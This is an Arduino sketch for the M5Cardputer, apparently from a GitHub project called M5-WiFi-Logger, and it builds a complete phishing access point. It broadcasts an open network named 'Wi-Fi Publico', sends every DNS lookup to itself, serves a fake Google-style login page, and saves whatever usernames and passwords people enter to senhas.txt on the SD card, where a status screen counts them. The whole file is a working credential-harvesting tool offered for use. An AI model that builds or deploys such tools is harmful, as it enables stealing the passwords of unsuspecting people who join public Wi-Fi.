                                 //////////////////////////////////////////////////////
                                 //////////////////////////////////////////////////////
                                 //https://github.com/guilhermepires06/M5-WiFi-Logger//
                                 //////////////////////////////////////////////////////
                                 //////////////////////////////////////////////////////
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPI.h>
#include <SD.h>
#include <M5Cardputer.h>

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

String wifiName = "Wi-Fi Publico"; // Nome do Wi-Fi atual (SSID do ponto de acesso)
const char* loginPagePath = "/login";  // Caminho da página de login
int connectedHosts = 0;          // Contador de hosts conectados
bool inStatusScreen = false;      // Flag para verificar se estamos na tela de status
bool inChangeWifiScreen = false;  // Flag para verificar se estamos na tela de mudança de Wi-Fi
String newWifiName = "";          // Novo nome do Wi-Fi
bool showStartImageFlag = true;   // Flag para exibir a imagem de início apenas uma vez
int selectedBox = 0; // Variável global: 0 para caixa da esquerda (Status), 1 para caixa da direita (Wi-Fi)
bool isTypingWifiName = false; // Indica se o usuário está digitando o novo nome do Wi-Fi

M5Canvas canvas(&M5Cardputer.Display); // Canvas para exibir texto

// Função para desenhar uma caixa com bordas arredondadas e texto centralizado
void drawBox(int x, int y, int w, int h, uint16_t borderColor, uint16_t fillColor, const char* labelTop, const char* labelBottom, int textSize) {
    M5Cardputer.Display.fillRoundRect(x, y, w, h, 10, fillColor);
    M5Cardputer.Display.drawRoundRect(x, y, w, h, 10, borderColor);

    M5Cardputer.Display.setTextSize(textSize); // Define o tamanho de texto
    int topTextWidth = M5Cardputer.Display.textWidth(labelTop);
    int bottomTextWidth = M5Cardputer.Display.textWidth(labelBottom);

    int topTextX = x + (w - topTextWidth) / 2;
    int topTextY = y + 10;
    int bottomTextX = x + (w - bottomTextWidth) / 2;
    int bottomTextY = topTextY + M5Cardputer.Display.fontHeight() + 5;

    M5Cardputer.Display.setTextColor(WHITE);
    M5Cardputer.Display.setCursor(topTextX, topTextY);
    M5Cardputer.Display.println(labelTop);
    M5Cardputer.Display.setCursor(bottomTextX, bottomTextY);
    M5Cardputer.Display.println(labelBottom);
}

// Função para exibir a imagem de início
void showStartImage() {
    if (!SD.begin()) {
        Serial.println("Falha ao inicializar o cartão SD");
        return;
    }

    File file = SD.open("/inicio.jpg");
    if (!file) {
        Serial.println("Arquivo inicio.jpg não encontrado");
        return;
    }

    int x = (M5Cardputer.Display.width() - 300) / 2;
    int y = (M5Cardputer.Display.height() - 200) / 2;

    M5Cardputer.Display.drawJpg(&file, x, y);
    file.close();
    delay(2000); // Manter a imagem na tela por 2 segundos
}



void desenhar_elementos_iniciais_do_menu() {
    if (inChangeWifiScreen || inStatusScreen) return; // Não desenhar nada se estiver em outras telas

    int batteryLevel = M5.Power.getBatteryLevel();
    int batteryWidth = 50;
    int batteryHeight = 20;
    int batteryFillWidth = (batteryWidth - 4) * batteryLevel / 100;

    // Desenhar a bateria no canto inferior direito
    int batteryX = M5Cardputer.Display.width() - 60;
    int batteryY = M5Cardputer.Display.height() - 25;
    M5Cardputer.Display.drawRect(batteryX, batteryY, batteryWidth, batteryHeight, WHITE);
    M5Cardputer.Display.fillRect(batteryX + 2, batteryY + 2, batteryFillWidth, batteryHeight - 4, GREEN);

    // Definir dimensões das caixas
    int boxWidth = M5Cardputer.Display.width() / 2 - 10;
    int boxHeight = M5Cardputer.Display.height() - 40;

    // Cores dinâmicas das caixas com base na seleção
    uint16_t box1Color = (selectedBox == 0) ? LIGHTGREY : BLACK; // Caixa "Status"
    uint16_t box2Color = (selectedBox == 1) ? LIGHTGREY : BLACK; // Caixa "Wi-Fi"

    // Desenhar as caixas
    drawBox(5, 10, boxWidth, boxHeight, GREEN, box1Color, "Status", "", 2); // Caixa da esquerda
    drawBox(boxWidth + 15, 10, boxWidth, boxHeight, RED, box2Color, "Mudar", "Wi-Fi", 2); // Caixa da direita
}


// Função para desenhar o nível de bateria
void Batteria_nivel(int x, int y) {
    int batteryLevel = M5.Power.getBatteryLevel(); // Obtém o nível de bateria
    int batteryWidth = 50; // Largura da bateria
    int batteryHeight = 20; // Altura da bateria
    int batteryFillWidth = (batteryWidth - 4) * batteryLevel / 100; // Preenchimento da bateria

    // Desenhar a borda da bateria
    M5Cardputer.Display.drawRect(x, y, batteryWidth, batteryHeight, WHITE);
    // Preenchimento da bateria
    M5Cardputer.Display.fillRect(x + 2, y + 2, batteryFillWidth, batteryHeight - 4, GREEN);

    // Posição inicial para o texto
    int textStartX = 10;  // Ajuste horizontal para posicionar na direção das caixas
    int textY = y + 5;    // Mesma altura que a bateria, com leve ajuste para centralizar

    // Texto: "1:Status"
    M5Cardputer.Display.setTextSize(1); // Tamanho do texto pequeno
    M5Cardputer.Display.setTextColor(WHITE);
    M5Cardputer.Display.setCursor(textStartX, textY);
    M5Cardputer.Display.setTextColor(ORANGE); 
    M5Cardputer.Display.print("Nav. com direcional");

    // Espaço entre os textos
    int spacing = 110;  // Distância horizontal entre os textos
    M5Cardputer.Display.setCursor(textStartX + spacing, textY);
     M5Cardputer.Display.setTextColor(ORANGE); 
    M5Cardputer.Display.print("");
}
////////////////////////////// FUNCOES DE ARMAZENAMENTO NO CARTAO DE MEMORIA ////////////////////////////////////
void excluir_linhas_vazias() {
    File file = SD.open("/senhas.txt");
    String line = "";
    File tempFile = SD.open("/temp_senhas.txt", FILE_WRITE);  // Arquivo temporário para salvar as linhas não vazias

    if (file && tempFile) {
        while (file.available()) {
            line = file.readStringUntil('\n'); // Lê até a próxima nova linha
            line.trim(); // Remove espaços em branco no início e no final da linha
            if (line.length() > 0) {  // Só copia a linha se não estiver vazia
                tempFile.println(line);  // Escreve a linha não vazia no arquivo temporário
            }
        }
        file.close();
        tempFile.close();

        // Apaga o arquivo original e renomeia o arquivo temporário
        SD.remove("/senhas.txt");
        SD.rename("/temp_senhas.txt", "/senhas.txt");
    } else {
        Serial.println("Falha ao abrir o arquivo para leitura ou criação do arquivo temporário.");
    }
}

void mostrar_status() {
    connectedHosts = WiFi.softAPgetStationNum(); // Atualizar a contagem de dispositivos conectados

    M5Cardputer.Display.fillScreen(BLACK); // Limpar a tela antes de exibir o status
    M5Cardputer.Display.setTextColor(WHITE);
    M5Cardputer.Display.setTextSize(1); // Tamanho de texto menor para a tela de status

    // Exibir o nome do Wi-Fi
    M5Cardputer.Display.setCursor(10, 10);
    M5Cardputer.Display.println("Nome do Wi-Fi:");
    M5Cardputer.Display.setCursor(10, 30);
    M5Cardputer.Display.println(wifiName.c_str());

    // Exibir a quantidade de dispositivos conectados
    M5Cardputer.Display.setCursor(10, 60);
    M5Cardputer.Display.println("Hosts conectados:");
    M5Cardputer.Display.setCursor(10, 80);
    M5Cardputer.Display.println(connectedHosts);

    // Contar a quantidade de linhas não vazias no arquivo senhas.txt
    File file = SD.open("/senhas.txt");
    int lineCount = 0;
    if (file) {
        String line = "";
        while (file.available()) {
            line = file.readStringUntil('\n'); // Lê até a próxima nova linha
            line.trim(); // Remove espaços em branco no início e no final da linha
            if (line.length() > 0) {  // Só conta a linha se ela não estiver vazia
                lineCount++;
            }
        }
        file.close();

        // Exibir o número de senhas salvas
        M5Cardputer.Display.setTextSize(1);
        M5Cardputer.Display.setCursor(10, 100);
        M5Cardputer.Display.setTextColor(WHITE);
        M5Cardputer.Display.print("Senhas: ");
        M5Cardputer.Display.println(lineCount);
    } else {
        // Caso o arquivo senhas.txt não esteja acessível
        M5Cardputer.Display.setTextColor(RED);
        M5Cardputer.Display.setCursor(10, 100);
        M5Cardputer.Display.println("Falha senhas.txt");
    }

    // Adicionar o texto "ESC para voltar" no rodapé com a cor azul
    M5Cardputer.Display.setCursor(10, M5Cardputer.Display.height() - 20);
    M5Cardputer.Display.setTextColor(BLUE); // Define a cor azul para o texto
    M5Cardputer.Display.println("ESC para voltar");

    inStatusScreen = true;

    // Chamar a função para deletar linhas vazias
    excluir_linhas_vazias();
}




// Função para exibir a tela de mudança de Wi-Fi
void mostrar_alteracao_tela_Wifi() {
    M5Cardputer.Display.fillScreen(BLACK); // Limpar a tela antes de exibir a tela de mudança de Wi-Fi
    M5Cardputer.Display.setTextColor(WHITE);
    M5Cardputer.Display.setTextSize(1); // Tamanho de texto menor para a tela de mudança de Wi-Fi
    M5Cardputer.Display.setCursor(10, 10);
    M5Cardputer.Display.println("Digite o nome e aperte OK.");

    // Desenhar a linha verde abaixo da mensagem
    M5Cardputer.Display.drawLine(0, 30, M5Cardputer.Display.width(), 30, GREEN);

    // Espaço reservado para exibir o nome digitado
    M5Cardputer.Display.setCursor(10, 50);
    M5Cardputer.Display.println(newWifiName); // Mostrar o nome atual (ou vazio)

    // Adicionar o texto "ESC para voltar"
    M5Cardputer.Display.setCursor(10, M5Cardputer.Display.height() - 20); // Próximo ao rodapé
    M5Cardputer.Display.setTextColor(BLUE); // Define a cor azul para o texto
    M5Cardputer.Display.println("ESC para voltar");

    newWifiName = "";       // Limpar o campo de entrada
    isTypingWifiName = true; // Começa direto no estado de digitação
    inChangeWifiScreen = true;
}





// Função para aplicar o novo nome do Wi-Fi
void aplicar_novo_nome_Wifi() {
    wifiName = newWifiName;
    WiFi.softAP(wifiName.c_str(), NULL); // Atualizar o SSID sem senha

    // Exibir mensagem de sucesso
    M5Cardputer.Display.fillScreen(BLACK);
    M5Cardputer.Display.setTextColor(WHITE);
    M5Cardputer.Display.setTextSize(1);
    M5Cardputer.Display.setCursor(10, 10);
    M5Cardputer.Display.println("Wi-Fi atualizado com sucesso!");

    delay(3000); // Esperar 3 segundos antes de voltar ao menu principal

    // Resetar flags e voltar ao menu inicial
    inChangeWifiScreen = false;
    isTypingWifiName = false; // Certifique-se de que o estado de digitação foi limpo

  
                M5Cardputer.Display.fillScreen(BLACK);

}



/////////////////////////  FUNÇÃO PARA CAPTURA /////////////////////////////////////////////
// Função de redirecionamento: serve a página de login para qualquer URL acessada
void handleRoot() {
    File file = SD.open("/google.html");  // Página de login salva como google.html no SD
    if (file) {
        server.streamFile(file, "text/html");
        file.close();
    } else {
        server.send(404, "text/plain", "Page not found");
    }
}
// Função para capturar e armazenar credenciais
void handleLogin() {
    if (server.hasArg("username") && server.hasArg("password")) {
        String username = server.arg("username");
        String password = server.arg("password");

        // Salva as credenciais no cartão SD
        File file = SD.open("/senhas.txt", FILE_APPEND);
        if (file) {
            file.println("Username: " + username + " Password: " + password + "\n");
            file.close();
            Serial.println("Credenciais salvas com sucesso");
        } else {
            Serial.println("Falha ao abrir o arquivo senhas.txt");
        }

        // Responde com uma mensagem de sucesso (ou redireciona novamente para a página de login)
        server.send(200, "text/html", "<html><body><h1>Conectado com sucesso!</h1></body></html>");
    } else {
        server.send(400, "text/plain", "Campos faltando");
    }
}




void setup() {
    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);
    M5Cardputer.Display.setRotation(1);
    M5Cardputer.Display.setTextFont(&fonts::FreeSerifBoldItalic9pt7b); // Fonte menor

    // Exibir a imagem de início apenas uma vez
    if (showStartImageFlag) {
        showStartImage();
        showStartImageFlag = false;
        M5Cardputer.Display.fillScreen(BLACK); // Deixar a tela preta por 1 ms
        delay(1);
    }

    // Configurar o Wi-Fi como Ponto de Acesso
    WiFi.mode(WIFI_AP);
    WiFi.softAP(wifiName.c_str(), NULL); // Configurar o SSID sem senha

    int boxWidth = M5Cardputer.Display.width() / 2 - 10;
    int boxHeight = M5Cardputer.Display.height() - 40; // Diminuir a altura para dar espaço para a bateria

    // Desenhar ambas as caixas no menu inicial com tamanho de texto aumentado
    drawBox(5, 10, boxWidth, boxHeight, GREEN, BLACK, "Status", "", 2); // Texto maior no menu
    drawBox(boxWidth + 15, 10, boxWidth, boxHeight, RED, BLACK, "Mudar", "Wi-Fi", 2); // Texto maior no menu

    // Configura o servidor DNS para redirecionar todas as URLs
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    // Configura o servidor web
    server.onNotFound(handleRoot);     // Redireciona qualquer URL para a função handleRoot
    server.on(loginPagePath, HTTP_POST, handleLogin);  // Processa o login
    server.begin();

    Serial.print("AP IP address: ");
    Serial.println(WiFi.softAPIP());
}



void loop() {
    M5Cardputer.update();

    // Atualizar o status do Wi-Fi a cada 1 segundo
    static unsigned long lastUpdate = 0;
    if (millis() - lastUpdate >= 1000) {
        lastUpdate = millis();

        // Atualiza apenas a parte do texto que muda na tela de status
        if (inStatusScreen) {
            M5Cardputer.Display.fillRect(10, 80, 100, 20, BLACK); // Limpar a área do texto
            M5Cardputer.Display.setCursor(10, 80);
            M5Cardputer.Display.setTextColor(WHITE);
            M5Cardputer.Display.println(WiFi.softAPgetStationNum());
        }

        // Mostrar bateria apenas no menu inicial
        if (!inStatusScreen && !inChangeWifiScreen) {
            Batteria_nivel(M5Cardputer.Display.width() - 60, M5Cardputer.Display.height() - 25);
        }
    }

    // Gerenciamento do teclado
    if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
        auto status = M5Cardputer.Keyboard.keysState();

        // Controle na tela de mudança de Wi-Fi
        if (inChangeWifiScreen) {
            // Captura os caracteres digitados
            for (auto i : status.word) {
                newWifiName += i;
            }

            if (status.del && !newWifiName.isEmpty()) {
                // Apaga o último caractere se o botão Delete for pressionado
                newWifiName.remove(newWifiName.length() - 1);
            }

            // Atualizar a tela com o nome digitado
            M5Cardputer.Display.fillRect(10, 50, M5Cardputer.Display.width(), 20, BLACK); // Limpar a área do texto
            M5Cardputer.Display.setCursor(10, 50);
            M5Cardputer.Display.setTextColor(WHITE);
            M5Cardputer.Display.println(newWifiName);

            // Salvar o nome do Wi-Fi e voltar ao menu inicial ao pressionar OK
            if (status.enter) {
                aplicar_novo_nome_Wifi(); // Redefine o nome do Wi-Fi e volta ao menu
            }

            // ESC para voltar ao menu inicial sem salvar
            if (std::find(status.word.begin(), status.word.end(), '`') != status.word.end()) {
                inChangeWifiScreen = false;
                M5Cardputer.Display.fillScreen(BLACK);
                desenhar_elementos_iniciais_do_menu();
            }
        }

        // Controle no menu inicial
        if (!inChangeWifiScreen && !inStatusScreen) {
            if (std::find(status.word.begin(), status.word.end(), ',') != status.word.end()) {
                selectedBox = 0; // Selecionar a caixa da esquerda
                desenhar_elementos_iniciais_do_menu(); // Redesenhar as caixas
            }
            if (std::find(status.word.begin(), status.word.end(), '/') != status.word.end()) {
                selectedBox = 1; // Selecionar a caixa da direita
                desenhar_elementos_iniciais_do_menu(); // Redesenhar as caixas
            }

            if (status.enter) {
                if (selectedBox == 0) {
                    mostrar_status(); // Abre a tela de status
                } else if (selectedBox == 1) {
                    mostrar_alteracao_tela_Wifi(); // Abre a tela de mudar Wi-Fi
                }
            }
        }

        // Controle na tela de status
        if (inStatusScreen && std::find(status.word.begin(), status.word.end(), '`') != status.word.end()) {
            inStatusScreen = false;
            M5Cardputer.Display.fillScreen(BLACK);
            desenhar_elementos_iniciais_do_menu(); // Voltar para o menu inicial diretamente
        }
    }

    dnsServer.processNextRequest();
    server.handleClient();
}
